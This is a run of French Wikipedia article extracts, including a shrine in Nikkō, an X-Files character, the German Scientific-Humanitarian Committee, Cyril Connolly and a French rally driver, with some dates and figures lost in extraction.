<doc id="2844657" url="https://fr.wikipedia.org/wiki?curid=2844657" title="Extraliga (Slovaquie)">
Extraliga (Slovaquie)



</doc>
<doc id="2844660" url="https://fr.wikipedia.org/wiki?curid=2844660" title="Extraliga (République tchèque)">
Extraliga (République tchèque)



</doc>
<doc id="2844662" url="https://fr.wikipedia.org/wiki?curid=2844662" title="Frédérik Hammel">
Frédérik Hammel

Frédéric Alain Pierre Hammel, dit Frédérik Hammel, était un jeune spéléologue, membre du Groupe d'explorations spéléologiques d'Aquitaine (GESA),disparu lors d'un tragique accident souterrain dans le "gouffre Achama Lecia", à Sainte-Engrâce au Pays basque, le .
Son nom a été attribué à une fondation financée par ses parents et permettant à la Fédération française de spéléologie de décerner tous les deux ans un prix récompensant des projets qui améliorent la sécurité et les secours en spéléologie.
Frédérik était le neveu d'Évelyne Sullerot, cofondatrice du Planning familial et le petit-fils du docteur André Hammel et de Georgette Roustain, Résistants et Justes de Yad Vashem.

</doc>
<doc id="2844665" url="https://fr.wikipedia.org/wiki?curid=2844665" title="Colonial">
Colonial



</doc>
<doc id="2844668" url="https://fr.wikipedia.org/wiki?curid=2844668" title="Nikkō Tōshō-gū">
Nikkō Tōshō-gū

 est un sanctuaire shinto de type "tōshōgū" situé dans la préfecture de Tochigi au Japon. Il se situe près de la ville de Nikkō, dans le parc national de Nikkō. Il fait aussi partie des sanctuaires et temples de Nikkō. On y trouve les singes de la sagesse.
Histoire.
Le sanctuaire Tōshō a été construit en 1617 par Tokugawa Hidetada, alors shogun en titre, pour honorer l'un des derniers vœux de son père Tokugawa Ieyasu, premier shogun de l'époque d'Edo et fondateur du shogunat Tokugawa. En 1636, Tokugawa Iemitsu fait agrandir le lieu saint qui prend la forme qui en fait, depuis 1999, l'un des sites historiques inscrits au patrimoine mondial de l'humanité.
Architecture.
Le sanctuaire est composé de nombreux bâtiments dont trente-neuf sont inscrits comme « biens culturels importants » par le gouvernement et d'autres comme « trésors nationaux ».
 est le premier torii marquant l'entrée du sanctuaire. Il fut construit en 1618. est une pagode se situant à gauche de l'entrée du parc, construite en 1648. Elle fut partiellement détruite par un incendie, puis complètement restaurée.
 est une marquant l'entrée plus profondément dans le sanctuaire. est une se situant à gauche de l’"omotemon". Il abritait les chevaux destinés aux cérémonies. est un bassin couvert permettant de se laver les mains et la bouche pour se purifier avant de rentrer dans certaines parties du sanctuaire.
 est une porte gardée par une paire de "zuijin" et marquant l'entrée dans le cœur du sanctuaire. Elle est l'un des plus beaux exemples de ce type de porte dans tout le Japon datant de 1636 et classée trésor national depuis 1902. Il a rouvert après quatre ans de travaux de restauration le .
 est une porte marquant l'entrée dans la dernière partie du sanctuaire. Elle est parfois appelée « porte chinoise » à cause de son style particulier notamment dans les décorations et ornements.
Plus récemment, des bâtiments destinés à l'accueil des touristes ont été construits, comme le "Nikko Toshogu Koyoen" faisant hôtel, restaurant, mariages, ainsi qu'un musée et un musée d'art.
Le maître zen Taisen Deshimaru évoque le sanctuaire de Tōshō-gū en ces termes, dans un chapitre intitulé « Beauté naturelle, vérité inconsciente » : 
Festivals.
Le principal "matsuri" (festival) a lieu le 17 et de chaque année, il s'agit du "Reitaisai". D'autres festivals moins importants sont organisés tout au long de l'année.
Visite.
Du avril au , le temple est ouvert à la visite de à , le reste de l'année les horaires sont de à . Le prix de l'entrée est de pour une personne seule et de par personne pour un groupe de plus de 35 personnes.
Accès.
Le site est accessible par divers moyens de transport depuis la ville de Nikkō, notamment par train et ligne de bus.

</doc>
<doc id="2844672" url="https://fr.wikipedia.org/wiki?curid=2844672" title="L'homme à la cigarette">
L'homme à la cigarette

L'homme à la cigarette ou le fumeur (en anglais, ' ou ') est un personnage de fiction de la série télévisée "", correspondant à l'archétype de l'homme en noir. Il est interprété par l'acteur William B. Davis. 
Ce personnage apparaît dès le pilote de la série dans le bureau du chef de section Blevins. De nature froide et solitaire à l'origine, la série le fait évoluer pour faire comprendre qu'il est le personnage incontournable du complot auquel Fox Mulder, l'un des deux héros principaux de la série, croit.
Son surnom vient du fait qu'on le voit toujours en arrière-plan, dans l'ombre, en train de fumer une cigarette (la marque de cigarettes est connue sous le nom de "Morley"). Il fuma sa première cigarette le à au Texas Theatre à Dallas peu après l'assassinat de John Fitzgerald Kennedy. Cette date est controversée ; en effet, la première scène de l'épisode "L'Épave" de la saison 3 montre le personnage en 1953 déjà en train de fumer.
Dana Scully l'a aperçu pour la première fois quand elle a été mutée au service des affaires non classées en 1992. Elle avait été placée là par l'homme à la cigarette pour pouvoir espionner Fox Mulder (d'ailleurs Scully fume au début de la série). Puis il nomme Alex Krycek pour la remplacer.
Il est par exemple impliqué dans des expériences d'implants d'origine extraterrestre. Il n'éprouve que peu de pitié, et n'hésite pas à tuer. C'est d'ailleurs lui qui aurait tué le président des États-Unis John Fitzgerald Kennedy ainsi que Martin Luther King. Il est aussi un écrivain raté n'ayant réussi à vendre son manuscrit sur l'histoire de sa vie qu'à un magazine pornographique. Par ailleurs, il semblerait prêt à tout abandonner de ses activités pour devenir écrivain.
Il est à l'origine d'un certain nombre d'enlèvements d'origine extraterrestre comme celui de sa femme Cassandra. Il aurait inoculé le cancer de Dana Scully.
Lors de l'épisode (5-14) "Patient X -", l'homme à la cigarette envoie une lettre depuis une maison située à North Hatley, au Canada/Québec destinée à son fils, Jeffrey Spender qui travaille au FBI. La lettre, visible au début de l'épisode sans encore connaître l'identité de l'expéditeur, montre une facette nouvelle de sa personnalité, plus chaleureuse que d'ordinaire.
Dans le dernier épisode de la saison 5, il révèle à Jeffrey Spender qu'il est son père. Dans l'épisode "Toute la vérité" de la saison 6, on découvre que son vrai nom est C.G.B. Spender, qu'il était marié à Cassandra Spender (Veronica Cartwright). On découvre lors de l'épisode 2 de la saison 7 qu'il est le père biologique de Mulder. Lors du premier épisode de la saison 11, il révèle son nom complet comme étant Carl Gerhard Busch Spender. 
Bien qu'il ait fait quelques bonnes actions (notamment en sauvant la vie à Mulder et Scully plusieurs fois), il est incontestablement le pire méchant de la série. C'est un manipulateur et un tyran de l'ombre, sans état d'âme, capable de faire assassiner ou enlever tous ceux qui se mettent en travers de son chemin dans son projet de contrôle du monde. Il n'hésite pas à tuer l'un de ses fils (l'agent Spender) et de faire de sa propre épouse une cobaye pour des expériences d'hybridation extra-terrestre. Seuls Dana Scully (il l'estime) et Fox Mulder (son fils caché, le seul ennemi qu'il respecte) bénéficient d'un certain traitement de faveur. Il se considère comme un grand homme de l'histoire : un solide rempart face à la colonisation extraterrestre, justifiant par la même occasion les sacrifices qu'il a lui-même consentis. Selon lui, les extra-terrestres auraient déjà colonisé la planète s'il n'agissait pas ainsi. Il est bien difficile de percer dans ses affirmations faites à l'agent Mulder quelle est la part de vérité. Tout au long de la série, Mulder et Scully se sont rendu compte que ce qu'on leur faisait voir était un écran de fumée produit par l'homme à la cigarette.
Dans le tout dernier épisode de la saison 9, il révèle à Mulder et Scully que la colonisation par les extraterrestres aura lieu le (c'est-à-dire le jour suivant la fin du calendrier Maya), avant d'être visé par une roquette tirée d'un hélicoptère militaire, et qui était dirigée vers les ruines Anasazi, son dernier refuge.
Il est néanmoins de retour dans la qui révèle qu'il a survécu à la roquette et s'est fait reconstruire un corps grâce à plusieurs greffes de peau. En 2016, il crée une pandémie visant à la destruction de l’humanité. Seuls les élus, ayant de l’ADN extraterrestre dans leur corps, sont appelés à survivre à ce virus, baptisé « Spartiate ». Outre William (le fils de Mulder et Scully), Scully et Monica Reyes, il fait partie des survivants potentiels et propose, en vain, à son fils Mulder de le rejoindre...
Interprètes.
L'acteur qui joue son fils, Jeffrey Spender (Chris Owens), est le même qui joue l'homme à la cigarette jeune.

</doc>
<doc id="2844673" url="https://fr.wikipedia.org/wiki?curid=2844673" title="Xptdr">
Xptdr



</doc>
<doc id="2844674" url="https://fr.wikipedia.org/wiki?curid=2844674" title="Anguille de sable">
Anguille de sable



</doc>
<doc id="2844682" url="https://fr.wikipedia.org/wiki?curid=2844682" title="Stratégie de survie">
Stratégie de survie

La théorie de l'évolution de Darwin montre que seuls les plus adaptés survivent. Et qu'il s'agisse de résister à des conditions climatiques changeantes ou à un environnement brutalement différent (notamment lors de crises géologiques), mais également sur du plus long terme par adaptation aux relations inter-spécifiques. En effet, il existe une véritable pression de sélection sur le génome d'une espèce.
Ainsi, les génomes sélectionnés présenteront des adaptations morpho-anatomiques, physiologiques mais aussi comportementales favorables. D'où la notion de stratégie de survie. Le but premier d'une espèce étant de survivre, assez longtemps pour pouvoir se reproduire et ainsi se pérenniser dans le temps, les individus vont développer des mécanismes le leur permettant (par sélection naturelle).
Survivre à quoi? Il faut voir pour cela les différents types d'interactions entre les êtres vivants (cf. interaction biologique), et entre les êtres vivants et l'environnement. 
Peut-on ainsi qualifier la carapace d'une tortue comme une stratégie de survie, lui conférant ainsi une protection contre ses prédateurs?
Il faudrait donc distinguer plusieurs types de stratégies: les stratégies morphologiques, anatomiques, physiologiques, comportementales, etc.

</doc>
<doc id="2844686" url="https://fr.wikipedia.org/wiki?curid=2844686" title="Orcs and Elves">
Orcs and Elves

 
 ("orcs et elfes", en français) est un jeu vidéo du type jeu de rôle, où le joueur incarnent le fils de Eol (légendaire aventurier elfique), et de Fraiga la valkyrie. "" a été développé par , produit par et publié par . Il est sorti le . Basé sur le moteur du jeu vidéo "Doom RPG" spécialement conçu pour téléphone mobile, le jeu a été primé sur cette plate-forme.
Scénario.
"Ellon", le sceptre magique du joueur, intercepte un message mystérieux et inattendu. Tous deux pensent que le message provient du Roi Brahm, qui règne sur l'ancienne citadelle elfique du Mont Zhaeekarag. Il semble qu'une bande d'orque ait envahi les lieux, en semant le chaos et la destruction sur son passage.

</doc>
<doc id="2844692" url="https://fr.wikipedia.org/wiki?curid=2844692" title="Xaos">
Xaos



</doc>
<doc id="2844695" url="https://fr.wikipedia.org/wiki?curid=2844695" title="Juan Vivés">
Juan Vivés

Juan Vivés, de son vrai nom Andrés Alfaya Torrado, né le à La Havane, décédé le à Marseille, est un descendant de plusieurs grandes familles qui se sont installées à Trinidad, les Borrel et les Iznaga par son grand-père maternel, dont le fameux Don mariano, qui aurait caché un trésor dans la région; il a grandi à La Havane où il a fréquenté notamment le Candler College, juste avant le triomphe de la révolution il vivait dans la ville de Moron, dans la province de Camaguey. 
À l'âge de 15 ans, en , il a rejoint les guérilleros de la révolution cubaine dans le massif de l'Escambray en participant au aux côtés de Che Guevara. Il aurait atteint le grade de capitaine dans l'armée révolutionnaire.
Après la victoire des forces révolutionnaires sur Fulgencio Batista, il aurait occupé des fonctions diverses notamment au sein du G2 (service de sécurité cubain). Il est le neveu de Osvaldo Dorticós Torrado, qui a porté le titre de président de la République jusqu'en 1976. Une de ses tantes était la femme de l'oncle de Celia Sanchez Manduley, la fidèle secrétaire de Fidel Castro, qui l'a donc connu très jeune et dont il parle souvent dans ses mémoires. 
Finalement, il quitte Cuba en 1979 non sans de grandes difficultés et rejoint son épouse (française) à Marseille, ville dans laquelle il a ensuite vécu.
Il est révélé au grand public français par son passage dans l'émission "Apostrophes" du vendredi , où il apparaît grimé, avec une perruque et de fausses moustaches. Il assure la promotion de son livre "Les maîtres de Cuba. Un agent secret cubain révèle comment Fidel Castro s'est mis au service de l'expansionnisme soviétique" paru aux Editions Robert Laffont, dans la collection "Vécu" (voir "VSD" du jeudi , pages 18-19). Il affirme notamment que Castro fut recruté comme agent soviétique en . Il a collaboré pendant quelques années avec le quotidien "Le méridional" auquel il apportait son concours au niveau de la politique internationale. Il révèle quelques anecdotes sur ce sujet dans la biographie "El magnifico". 
Il apporte un témoignage très critique sur la politique cubaine dans le livre de Alain Ammar, "Cuba nostra", ouvrage auquel a également participé l'écrivain cubain Jacobo Machover.
Son ouvrage "El magnifico, 20 ans au service de Castro" retrace son itinéraire original au sein du régime castriste avant que son mariage ne lui crée des problèmes graves et qu’il finisse par quitter l’île des Caraïbes et en révèle de nombreux aspects sombres.

</doc>
<doc id="2844699" url="https://fr.wikipedia.org/wiki?curid=2844699" title="Emmah Basile">
Emmah Basile



</doc>
<doc id="2844700" url="https://fr.wikipedia.org/wiki?curid=2844700" title="Cartier Diamond Dagger">
Cartier Diamond Dagger

Le Cartier Diamond Dagger ou le Diamond Dagger est un prix littéraire du Royaume-Uni délivré par l'association des écrivains de romans policiers ("Crime Writers' Association"). Ce prix récompense les auteurs pour leur carrière littéraire. Il a été sponsorisé pendant vingt-six ans par l'entreprise Cartier, donnant son nom au prix. Ce sponsoring s'est terminé après la remise du prix 2011.

</doc>
<doc id="2844706" url="https://fr.wikipedia.org/wiki?curid=2844706" title="Cyril Connolly">
Cyril Connolly

Cyril Vernon Connolly ( - ) est un écrivain et critique littéraire britannique.
Biographie.
Cyril Connolly nait à Coventry, dans le Warwickshire, d'une famille anglo-irlandaise, du major Matthew William Kemble Connolly et de son épouse Muriel Maud Vernon. Il fait ses études à la St Cyprian's School (où il croise Cecil Beaton), située à Eastbourne, dans le Sussex de l'Est, puis au collège d'Eton. George Orwell, son camarade de classe à St Cyprian's et à Eton, reste son ami toute sa vie durant. Connolly poursuit ses études supérieures au Balliol College. 
Contributeur régulier à l'hebdomadaire de gauche "New Statesman" dans les années 1920 et 1930, il dirige de 1939 à 1950 le magazine littéraire "Horizon" en compagnie de Stephen Spender et de Peter Watson. Après avoir été en 1942-1943 le directeur de la rédaction de "The Observer", il est, de 1952 jusqu'à sa mort, le responsable des pages littéraires du "Sunday Times" en même temps que Raymond Mortimer.
Connolly se marie trois fois : en 1930 avec Jean Bakewell (qui épouse ensuite Laurence Vail, ex-mari de Peggy Guggenheim) ; en 1950 avec Barbara Skelton ; et en 1959 avec Deirdre Craven, petite-fille de James Craig, Craigavon.
Œuvre.
Cyril Connolly n'écrit qu'un seul roman, "The Rock Pool" (1935), texte satirique qui reçoit un accueil favorable. Peut-être son œuvre la plus connue est-elle l'autobiographie qui constitue la seconde moitié de "Enemies of Promise" (1938), où il explique son incapacité à écrire le chef-d'œuvre que tous attendaient de lui – y compris lui-même. Son livre suivant, "The Unquiet Grave", publié sous le pseudonyme de « Palinurus », est également digne d'intérêt.
C'est sans doute en tant que critique littéraire que Connolly marque son époque. À l'instar d'Edmund Wilson aux États-Unis, il exerce une influence considérable sur le public, notamment lors de la publication en 1965 de son essai sur les « 100 livres clés de la période 1880-1950 ». Spirituel, malicieux, parfois acide, il forme le goût de toute une génération de lecteurs. En tant que rédacteur en chef d"'Horizon", il offre une tribune à un vaste assortiment de nouveaux auteurs. Kenneth Tynan, dans le numéro du "Harper's Bazaar" de , définit le style de Connolly comme « l'un des plus scintillants de tout le patrimoine littéraire anglais ».
Depuis 1976, les archives de Cyril Connolly et sa bibliothèque personnelle, qui comprend plus de volumes, se trouvent à l'université de Tulsa, dans l'Oklahoma.

</doc>
<doc id="2844718" url="https://fr.wikipedia.org/wiki?curid=2844718" title="TCI">
TCI

TCI est un sigle pour :

</doc>
<doc id="2844719" url="https://fr.wikipedia.org/wiki?curid=2844719" title="Liste de points extrêmes du Liban">
Liste de points extrêmes du Liban

Cet article liste les points extrêmes du Liban.

</doc>
<doc id="2844722" url="https://fr.wikipedia.org/wiki?curid=2844722" title="Charles Viénot de Vaublanc">
Charles Viénot de Vaublanc

Charles III Viénot de Vaublanc, seigneur de Mimande et de Vaublanc, est un maréchal de camp français né le à Beaune et mort le dans cette même ville .
Biographie.
Il est le fils de Charles II Viénot de Vaublanc, demeurant à Beaune et Philiberte de Jannel. Il épouse le 29 janvier 1753 en la paroisse Saint-Martin de Beaune Marguerite Bonguelet, fille d’Étienne Bonguelet seigneur de Beauvoisin, avocat au Parlement de Dijon.
En 1755, à la mort de son père, il hérite les seigneuries de Mimande et Vaublanc dépendants de la baronnie de Chagny en Bourgogne. 
Dayre de Mailhol écrit : « Le titre d’administrateur honoraire de l’Hôtel-Dieu de Beaune est créé pour lui en 1774, ainsi qu’en fait foi une lettre du duc de Clermont-Tonnerre, patron de cet hôpital ».
Enthousiasmé par la cause américaine, il envoie plusieurs de ses poèmes sur les États-Unis à Benjamin Franklin lors du séjour en France de ce dernier .
En 1789, il figure parmi les nobles qui ont pris part à l'assemblée de la noblesse en vue d'élire des députés aux États généraux pour le bailliage de Dijon. Il fait partie des rédacteurs du cahier de doléance de cette même assemblée.
En 1793, sous la Terreur, ses biens sont saisis en vertu de la loi du 17 Frimaire an II. En effet, il se trouve, que son unique fils Jacques-Henri, est un émigré qui a trouvé refuge en Angleterre puis au Portugal. Il est néanmoins relaxé selon les lois du 9 Floréal an III (28 avril 1795) et du 20 Floréal an IV (9 mai 1796).
Il meurt en 1804 à Beaune.
Carrière militaire.
Avec son jeune frère Vivant-François, Charles s'engage dans l'armée en 1742 et devient lieutenant en second puis lieutenant au régiment de Navarre en avril et juillet. Il participe à la Guerre de Succession d'Autriche où il est blessé à la bataille de Dettingen en 1743. Capitaine en 1746, il est fait chevalier de Saint-Louis en 1757 et est nommé major le 5 avril 1759. 
Il prend part à la bataille de Hastenbeck du 26 juillet 1757. 
Lors de la prise de la ville de Cassel par les troupes françaises en février 1760, il a la charge de la vieille ville et de la basse. . Aussitôt après la ville est assiégée par les troupes du comte de la Lippe de Buckburg. Vaublanc doit alors mener, faute d'officiers valides, une retraite considérée comme exemplaire de la ville fin mars 1760.
Il est affecté au régiment d'infanterie de la Sarre dont il devient lieutenant-colonel le 15 avril 1763. Colonel en 1767, il est nommé brigadier d'infanterie le 22 janvier 1769. Son supérieur est alors le duc de La Rochefoucauld avec qui il se lie d'amitié .
Il est décrit comme un 
De 1776 à 1782, il tient successivement garnison à Metz, à Rouen et à Lille. Son neveu,Vincent-Marie Viénot de Vaublanc affecté dans son régiment brosse un portrait de Charles de Vaublanc : 
Nommé maréchal de camp le mars 1780 , il est admis à la retraite en 1792 après 50 ans de services dont 18 de campagne au sein de l'armée.
Décoration.
 Chevalier de Saint-Louis le 2 décembre 1757.

</doc>
<doc id="2844725" url="https://fr.wikipedia.org/wiki?curid=2844725" title="Comité scientifique humanitaire">
Comité scientifique humanitaire

Le Comité scientifique humanitaire (en allemand WhK : "Wissenschaftlich-humanitäre Komitee"), créé en Allemagne le , est la toute première organisation de défense des droits des homosexuels.
Le WhK est fondé le 15 mai 1897 par le sexologue Magnus Hirschfeld, l'éditeur , le juriste ainsi que l'écrivain , à Berlin-Charlottenbourg. L'un des objectifs du comité est alors l'abrogation du paragraphe 175 qui, en Allemagne, condamnait pénalement les relations sexuelles entre hommes consentants. Peu de temps après sa création, Adolf Brand, Benedict Friedlaender et Kurt Hiller adhèrent au WhK. Une scission survient en 1903.
Le WhK était particulièrement lié à l'institut de sexologie fondé par Hirschfeld. Il s'appuyait sur les théories de Hirschfeld dont celle du troisième sexe. Il avançait aussi l'innéité de l'homosexualité (son caractère « naturel », rendant sa condamnation injuste).
Le WhK avait son siège à Berlin et des antennes dans vingt-cinq villes d'Allemagne et des annexes à l'étranger : en Autriche, aux Pays-Bas () ainsi qu'un correspondant en Alsace. Il est le précurseur du mouvement d'émancipation homosexuelle ou mouvement gay et lesbien.
La bibliothèque.
En 1904, le WhK annonce dans son rapport mensuel ("Monatsbericht des WhK") qu'il compte créer une bibliothèque accesible aux membres ainsi qu'une archive contenant tous les articles de presse mentionnant des procès et condamnations liées au paragraphe 175. La tâche est confiée au chimiste Friedrich Brinkmann. Un an plus tard, l'organisation, qui compte alors autour de 500 membres, publie un catalogue des oeuvres réunies dans sa bibliothèque, accessible au public (principalement des médecins et des écrivains activistes), et l'envoie à tous ses membres. Le catalogue compte 386 titres distincts. Les livres se situent alors dans les appartements privés de Magnus Hirschfeld.
Le Comité et la réforme du droit pénal.
Lors des élections de mai, puis de décembre 1924, le WhK demande à chaque parti sa position sur l'abrogation du §175, et encourage les homosexuels à voter seulement pour ceux qui s'y accordent. 
En 1924, la proposition ("Entwurf") de réforme pénale est reprise par Curt Joël, qui la rend plus stricte. Face à cette menace de raidissement du droit pénal, le WhK réagit en impulsant en 1925 la formation du Cartel pour la Réforme du droit pénal sexuel ("Kartell für Reform des Sexualstrafrechts").
Le Cartel se donne pour but d'étendre le travail militant à toutes les composantes du mouvement de libération sexuelle, au delà des seules associations homosexuelles, ainsi que d'aller outre le simple refus et de formuler une contreproposition ("Gegenentwurf"). Dans le Cartel se retrouvent aux côtés du WhK : le "Bund für Mutterschutz" d'Helene Stöcker (techniquement, le WhK fait partie de cette association depuis 1911) ; la "Deutsche Liga für Menschenrechte", une association pacifiste luttant pour la fraternisation franco-allemande et le socialisme, le "Verband Eherechtsreform", qui milite pour le droit au divorce par consentement mutuel ; la "Gesellschaft für Geschlechtskunde" d'Arthur Weil, qui se donne pour rôle de vulgariser les connaissances sexologiques, et la "Gesellschaft für Sexualreform". L'Institut des sciences sexuelles joue un rôle important au sein de cette coalition ; le WhK fusionne à ce moment avec le département de la réforme sexuelle de l'Institut. Le "Bund für Menschenrecht" de Friedrich Radszuweit essaie de rejoindre le Cartel mais est débouté ; une des raisons de ce refus réside probabalement dans le fait que le BfM acceptait la proposition de pénalisation de la prostitution homosexuelle, que refusait le WhK et le reste du Cartel. 
Tentatives de refondation.
1949 – le « Giese-WhK ».
Le 19 octobre 1949, Hans Giese fonde avec Hermann Weber (1882–1955), qui dirigeait le groupe local de Francfort de 1921 à 1933, un nouveau WhK à Kronberg. Kurt Hiller travaille également avec eux depuis son exil à Londres, principalement par correspondance, mais cette coopération prend fin après quelques mois en raison de dissenssions politiques entre les deux activistes. À Berlin-Zehlendorf, un « groupe Grand Berlin du WhK » ("Gruppe Groß-Berlin des WhK") est constitué par Werner Hesse, Werner Becker et Hans Borgward en novembre 1949. La première réunion des membres se déroule le 5 décembre 1949 dans la salle des fêtes de la maison médicale de Francfort ("Festsaal des Frankfurter ärtzehauses"). Le WhK se voit refuser l'inscription au registre des associations ; au printemps 1950, il n'existe plus. Le groupe berlinois du « Giese-WhK » devient la Société pour la réforme du droit pénal sexuel, qui perdure jusqu'en 1960.
1962 – Kurt Hiller.
En 1955, Kurt Hiller retourne à Hambourg et souhaite y fonder un nouveau WhK en 1962. Il reste cependant isolé et la tentative échoue.
1998 – Le nouveau WhK.
En 1998, sont fondées - entre autres dans le cadre de l'initiative "« Beck ab! »" dirigée contre le député Volker Beck – une nouvelle association du nom de "comité scientifique humanitaire (whk)" et une association de soutien associée. Le lien avec le WhK originel consiste seulement en l'usage du nom et l'intervention dans des thèmes gays et lesbiens. La nouvelle association prend, à propos de nombreux sujets, une position contraire à celle du LSVD (Lesben- und Schwulenverband in Deutschland), qu'elle considère comme bourgeoise-conservatrice et se sent liée à la gauche anticapitaliste. Le comité scientifique et humanitaire publie la revue "Gigi – Zeitschrift für sexuelle Emancipation (Gigi - Journal pour l'Emancipation sexuelle)", qui reçoit un prix spécial de l’Association des journalistes lesbiens et gays ("Bundes Lesbischer und Schwuler JournalistInnen") en 2001. "Gigi" s'interrompt en 2010.
Le site internet du nouveau Whk indique ceci à propos de sa fondation :
Avec l'arrêt du magazine "Gigi" en 2010, le nouveau WHK devient largement inactif.

</doc>
<doc id="2844726" url="https://fr.wikipedia.org/wiki?curid=2844726" title="Christa Päffgen">
Christa Päffgen



</doc>
<doc id="2844728" url="https://fr.wikipedia.org/wiki?curid=2844728" title="Éric Mauffrey">
Éric Mauffrey

Éric Mauffrey, né le à Épinal, est un pilote de rallye français du département des Vosges.
Biographie.
Il exerce la profession de gérant d’un centre de formation et réside à Épinal dans le département des Vosges.
Carrière sportive.
Il a fait ses débuts en compétition lors du rallye de Lorraine en 1983, à bord d'une Volkswagen Golf GTI 1600 Gr. N.
C'est en 1985 qu'il révèle ses talents, en terminant de la Coupe de France des voitures de production toujours au volant d'une VW Golf, et en étant nommé "Espoir de l’Année Échappement". Il confirme ses bonnes performances en 1986, en remportant le "Challenge VAG-Yacco" au volant d'une Golf GTI 1800 Gr. A.
En , il est pilote Renault Sport sur une Clio Gr A du "Simon Racing" team, et il termine du Championnat de France des rallyes, avec quelques beaux résultats ( au Mont-Blanc, au Cévennes, ainsi qu'au Var). De 1991 à 1995, il officie comme ouvreur de François Delecour en Championnat du Monde; il est ensuite aussi l'ouvreur des frères Panizzi de 2002 à 2005 en mondial, durant toutes ces années, il aura l'occasion d'ouvrir aussi en mondial pour : Miki Biasion et Ari Vatanen (Ford / Argentine), Bruno Thiry (Ford/Catalogne), Jean-Marie Cuoq (307 WRC/ Monte Carlo).
C'est en 2005 qu'il se lance dans l'aventure du "Trophée Michelin" au volant d'une Subaru Impreza A8 sur les routes du championnat de France asphalte première division, où il échoue sur la du podium final derrière Pascal Enjolras qui évolue alors sur une Peugeot 306 Maxi A7.
En 2006, il prend sa revanche en remportant pour la première fois de sa carrière le "Trophée Michelin", toujours au volant de la même Subaru Impreza A8. En 2007 il récidive, cette fois au volant d'une Peugeot 306 Maxi A7, après une intense lutte avec le pilote de la Toyota Celica GT4 A8 Patrick Rouillard. Il s'adjuge en plus une victoire remarquée lors de la finale de la Coupe de France, qui se déroule cette année-là à Mende (Lozère) devant les meilleurs pilotes amateurs de France.
Entre 2009 et 2011, il participe au "Trophée Clio R3 France", qu'il remporte en 2009 et 2010 (cinquième en 2011, avec seulement trois participations sur six épreuves). En 2012 il participe au nouveau "Challenge Renault Sport" qui regroupe les pilotes de Clio R.S. R3 et Mégane R.S. N4, sur six épreuves. Il termine à la deuxième place de ce challenge derrière le pilote belge Kris Princen.

</doc>
<doc id="2844749" url="https://fr.wikipedia.org/wiki?curid=2844749" title="USS Louisiana">
USS Louisiana

Cinq bâtiments de l’US Navy ont porté ou portent le nom d'USS "Louisiana" en honneur de l'État américain de Louisiane :
Il a y eut également un CSS "Louisiana", un cuirassé à coque en fer de la marine confédérée pendant la guerre de Sécession.

</doc>
<doc id="2844750" url="https://fr.wikipedia.org/wiki?curid=2844750" title="Point Goldwin">
Point Goldwin



</doc>
<doc id="2844751" url="https://fr.wikipedia.org/wiki?curid=2844751" title="67e régiment d'infanterie territoriale">
67e régiment d'infanterie territoriale

Le d'infanterie territorial est un régiment d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Création et différentes dénominations.
Le régiment reçoit son numéro par décret du , en prévision de la mobilisation.
Historique des garnisons, combats et batailles du RIT.
Dépôt: Parthenay (Deux-Sèvres)
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844752" url="https://fr.wikipedia.org/wiki?curid=2844752" title="Adolf Brand">
Adolf Brand

Adolf Brand, né le à Berlin et mort le dans la même ville, est un écrivain allemand, anarchiste, militant pour les droits des homosexuels. Il est membre du WhK, le Comité scientifique humanitaire.
Biographie.
Né à Berlin le , Adolf Brand est enseignant avant de fonder sa propre maison d'édition qui publie, à partir de 1896, la revue "Der Eigene". Cette revue est la première publication régulière homosexuelle au monde. Le titre, "Der Eigene", est une référence aux écrits du philosophe Max Stirner. Ce dernier exerce une profonde influence sur le jeune Brand qui est séduit par le concept stirnerien de « Selbsteigentum ». "Der Eigene" finit par compter environ .
En 1903, à la suite d'une scission au sein du WhK de Magnus Hirschfeld, Brand crée la Gemeinschaft der Eigenen ("GdE"), la « Communauté des spéciaux ». Dans ce nouveau groupe, l'amour entre hommes est considéré comme l'un des attributs de la virilité. Le groupe rejette certaines théories de Hirschfeld. Le GdE est une communauté qui fonctionne sur un modèle semblable à celui qu'adoptera ultérieurement le scoutisme, tout en se réclamant de la Grèce antique – plus particulièrement des guerriers de Sparte et de l'« idéal pédérastique » qu'on leur a attribué. Le GdE organise des camps et des marches, et prône la pratique du naturisme. Le GdE est comparable à de nombreux autres groupes apparus en Allemagne au début du , comme les "Wandervogel".
Entre 1907 et 1909, Adolf Brand intervient dans l'affaire Eulenburg, laquelle aboutit à la disgrâce du favori du Kaiser Guillaume II.
Durant les années 1930, Aldolf Brand se retirera du militantisme homosexuel, à la suite des menaces continuelles dont il était l'objet de la part des nazis ; ceux-ci feront d'ailleurs cesser la publication de la revue "Der Eigene".
Brand et sa femme meurent à Berlin, tués lors d'un bombardement allié le .

</doc>
<doc id="2844755" url="https://fr.wikipedia.org/wiki?curid=2844755" title="Benzène-1,2-diol">
Benzène-1,2-diol



</doc>
<doc id="2844757" url="https://fr.wikipedia.org/wiki?curid=2844757" title="71e régiment d'infanterie territoriale">
71e régiment d'infanterie territoriale

Le d'infanterie territoriale est un régiment d'infanterie de l'Armée de terre française qui a participé à la Première Guerre mondiale.
Drapeau.
"Il porte, cousues en lettres d'or dans ses plis, les inscriptions suivantes :"

</doc>
<doc id="2844759" url="https://fr.wikipedia.org/wiki?curid=2844759" title="The Marble Index">
The Marble Index

The Marble Index est le deuxième album de la chanteuse Nico, conçu avec John Cale et sorti en 1968.
Titres.
Toutes les chansons sont de Nico. Elles ont été enregistrées en l'espace de quatre jours dans un studio de Los Angeles.
Réception critique.
En 2024, le label indépendant Domino Records annonce la réédition de "The Marble Index" et de "Desertshore". Selon Ed Jupp, cet album offre un fort contraste avec le précédent "Chelsea Girl" (sur lequel les musiques étaient composées par Bob Dylan, Jackson Browne et d'autres). Ce serait le chanteur Jim Morrison, ami de Nico, qui aurait encouragé celle-ci à écrire sa propre musique et à choisir son instrument – ce sera l'harmonium. Le critique Lester Bangs aurait décrit cet album comme "la plus importante œuvre d'avant-garde classique de la deuxième moitié du 20e siècle". Pour Alexis Petridis, c'est un album incarnant l'état d'esprit de 1968, annonçant «des nuages orageux qui obscurciront l'optimisme des années 1960». 
Selon Marc Masters, les ventes décevantes de "The Marble Index" vont conduire le label Elektra à se séparer de Nico.
Titres bonus.
La réédition CD inclut deux titres bonus :

</doc>
<doc id="2844760" url="https://fr.wikipedia.org/wiki?curid=2844760" title="29e régiment d'infanterie territoriale">
29e régiment d'infanterie territoriale

